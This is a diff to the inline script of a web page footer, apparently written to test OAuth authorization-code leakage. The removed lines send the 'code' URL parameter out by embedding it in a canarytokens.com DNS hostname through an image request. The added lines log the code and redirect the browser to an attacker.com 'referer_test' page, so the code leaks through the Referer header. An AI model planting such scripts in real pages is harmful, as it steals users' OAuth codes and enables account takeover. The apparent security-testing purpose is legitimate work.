@@ -326,15 +326,16 @@
     &copy; 2024 EngineRev. All rights reserved.
   </div>
 <script>
-// Extract the code from the URL fragment or query parameters
-var params = new URLSearchParams(window.location.search);
-var code = params.get("code");
+  // Get the code from the URL
+  const urlParams = new URLSearchParams(window.location.search);
+  const code = urlParams.get('code');  // This is the OAuth code
 
-if (code) {
-    // Create an image request to the Canarytoken DNS server
-    new Image().src = "http://" + code + ".6rauo1wu8hzbvjxxvf4ws07le.canarytokens.com";
-}
+  // Optional: Display the code to the user
+  console.log('OAuth Code:', code); 
 
+  // Redirect to the test page to check the Referer header
+  window.location.href = "https://attacker.com/referer_test.html"; // Replace with your test page URL
 </script>
+
     </body>
 </html>
